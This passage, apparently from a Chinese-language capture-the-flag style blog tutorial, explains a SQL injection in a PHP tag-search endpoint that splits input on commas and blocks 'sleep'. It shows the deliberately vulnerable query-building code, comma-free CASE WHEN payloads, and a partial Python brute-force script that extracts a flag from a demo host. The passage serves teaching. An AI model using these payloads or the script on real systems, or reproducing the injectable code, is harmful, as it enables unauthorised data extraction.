@@ -1,0 +1,107 @@
+因此我們可以知道資料庫裡一共有兩筆資料，接著我們可以傳入 `tag` 來 filter，找出指定的資料，像是這樣：
+
+https://od-php.herokuapp.com/sql/search.php?tag=5
+
+``` js
+[
+    {
+        "id": "2",
+        "name": "home2",
+        "tags": "1,5"
+    }
+]
+```
+
+tag 參數可以用逗號分格，一次搜尋多個值，像這樣：
+
+https://od-php.herokuapp.com/sql/search.php?tag=2,5
+
+``` js
+[
+    {
+        "id": "1",
+        "name": "home1",
+        "tags": "1,2,3,4"
+    },
+    {
+        "id": "2",
+        "name": "home2",
+        "tags": "1,5"
+    }
+]
+```
+
+功能大概就是這樣子而已，原本的實際案例會更複雜一點，但為了精簡因此只保留最精華的部分，其他無關的東西都拿掉了。
+
+接著，我們來看一下重點程式碼：
+
+``` php
+$sql = "SELECT id, name, tags from home ";
+
+if (strpos(strtolower($tag), "sleep") !== false) {
+  die("QQ");
+}
+
+if(!empty($tag) && is_string($tag)) {
+  $tag_arr = explode(',', $tag);
+  $sql_tag = [];
+  foreach ($tag_arr as $k => $v) {
+      array_push($sql_tag, "( FIND_IN_SET({$v}, tags) )");
+  }
+  if (!empty($sql_tag)) {
+      $sql.= "where (" . implode(' OR ', $sql_tag) . ")";
+  }
+}
+```
+
+這邊直接用字串拼接的方式組成 SQL query，因此很明顯有 SQL injection 的漏洞，如果你傳入 `?tag='`，SQL query 就會出錯，為了方便大家 debug，錯誤時會把 SQL query 印出來。
+
+想要撈出其他資料，一個很直覺的想法是利用 `union`，但這招在這裡行不通，原因是我們傳進去的參數會用 `,` 來分割，所以我們的 payload 裡不能有逗號，不然會把整個 query 搞壞，變成很奇怪的樣子。
+
+因此這題有趣的地方之一在於如何不用逗號，利用這個漏洞。
+
+一個簡單直覺的做法是用 case when 搭配 sleep，像這樣：
+
+``` sql
+(select case when (content like "c%") then 1 else sleep(1) end from flag)
+```
+
+從 response 的回傳時間，可以推測出條件有沒有成立，但因為程式碼把 sleep 給擋掉了，所以沒辦法這樣用（原本的案例是沒有擋這個的，是我額外加上去的）。
+
+但其實仔細觀察會發現我們不需要 sleep，可以利用 case when 的回傳值做原本的 filter 功能，從結果中推測哪個條件成立，像這樣：
+
+``` sql
+(select case when (content like "c%") then 1 else 10 end from flag)
+```
+
+當條件（`content like 'c%'`）成立時，回傳值就是 1，反之則是 10，而如果是 1 的話，回傳的 JSON 就會有資料，10 的話則沒有，因此我們可以根據有或沒有，得知條件是否成立。
+
+接著，我們就來寫一下這種最簡單做法的腳本。
+
+``` python
+# exploit-search.py
+import requests
+import datetime
+import json
+
+host = 'https://od-php.herokuapp.com/sql'
+char_index = 0
+char_set = 'abcdefghijklmnopqrstuvwxyz}_'
+result = 'cymetrics{'
+while True:
+  if char_index >= len(char_set):
+    print("end")
+    break
+
+  char = char_set[char_index]
+  payload = f'(select case when (content like "{result}{char}%") then 1 else 10 end from flag)'
+  response = requests.get(f'{host}/search.php?tag={payload}')
+  print("trying", char)
+  if response.ok:
+    data = json.loads(response.text)
+    if len(data) > 0:
+      result += char
+      print(result)
+      char_index = 0
+    else:
+      char_index += 1
